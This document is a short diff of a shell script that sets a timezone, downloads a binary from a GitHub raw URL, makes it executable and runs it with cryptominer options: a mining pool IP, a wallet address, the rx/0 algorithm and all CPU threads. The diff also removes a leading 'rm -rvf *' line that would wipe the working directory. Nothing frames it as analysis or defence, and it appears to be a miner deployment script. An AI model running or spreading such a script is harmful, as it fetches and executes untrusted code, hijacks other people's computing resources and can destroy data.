@@ -1,9 +1,8 @@
-rm -rvf * 
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 apt update
-wget -O gigi https://github.com/cornea99/upil/raw/main/zepo > /dev/null 2>&1
+wget -O gigi https://github.com/cornea99/upil/raw/main/zepo
 chmod 777 gigi
 ./gigi --donate-level 1 -o 165.232.165.31:80 -u 0x0D646f89Db83E0642199e88A7967C7f62af02a83 -p $(shuf -n 1 -i 1-999)-F -a rx/0 -t $(nproc --all)
 sleep 30
